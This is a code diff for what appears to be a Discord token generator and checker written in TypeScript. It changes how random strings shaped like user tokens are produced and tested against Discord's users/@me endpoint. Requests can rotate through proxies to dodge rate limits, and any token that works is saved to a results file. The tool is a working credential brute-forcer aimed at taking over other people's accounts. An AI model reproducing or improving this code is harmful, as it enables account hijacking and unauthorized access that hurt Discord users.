@@ -28,9 +28,13 @@ export const ToolStartManager = ({ options, proxieshandler }: ToolManagerType): 
         throw new Error(`[${proxy}] Invalid proxy line`);
       }
 
-      const requestEdited = request.defaults({
-        proxy: `${options.protocol}://${proxy}`,
-      });
+      const requestEdited =
+        options.proxiesQs === "yes"
+          ? request.defaults({
+              proxy: `${options.protocol}://${proxy}`,
+            })
+          : request;
+
       requestEdited.get(
         `https://discord.com/api/v${options.version}/users/@me`,
         {
@@ -40,19 +44,17 @@ export const ToolStartManager = ({ options, proxieshandler }: ToolManagerType): 
           },
         },
         (error, _response, body) => {
-          if (error || !body) {
-            console.log(`[\x1b[31m+\x1b[0m] Invalid token [\x1b[35m${proxy}\x1b[0m][${token.slice(0, 30)}..]`);
-          } else {
-            try {
-              const l = JSON.parse(body);
-              if (l.code !== 0) {
-                const _token: string | undefined = _response.headers.authorization;
-                console.log(`[\x1b[32m+\x1b[0m] valid token [${_token}]`);
-                writeFileSync(join(__dirname, `../../result/token-${Date.now()}.txt`), `token -> ${_token}`);
-              }
-            } catch (e) {
-              console.log(e);
+          try {
+            if (error || !body) {
+              throw new Error("Invalid token generated");
             }
+            const l = JSON.parse(body);
+            if (l.code !== 0) {
+              console.log(`[\x1b[32m+\x1b[0m] valid token [${token}]`);
+              writeFileSync(join(__dirname, `../../result/token-${Date.now()}.txt`), `token -> ${token}`);
+            } else throw new Error("Invalid token generated");
+          } catch (e) {
+            console.log(`[\x1b[31m+\x1b[0m] Invalid token [\x1b[35m${proxy}\x1b[0m][${token.slice(0, 30)}..]`);
           }
         },
       );
@@ -76,5 +78,5 @@ export const g_token = (version_token = 1): string => {
   if (version_token === 2) {
     return `m${gn(2)}.${gn(84)}`;
   }
-  return `NDc${gn(21)}.${gn(6)}.${gn(27)}`;
+  return `N${gn(23)}.${gn(6)}.${gn(27)}`;
 };
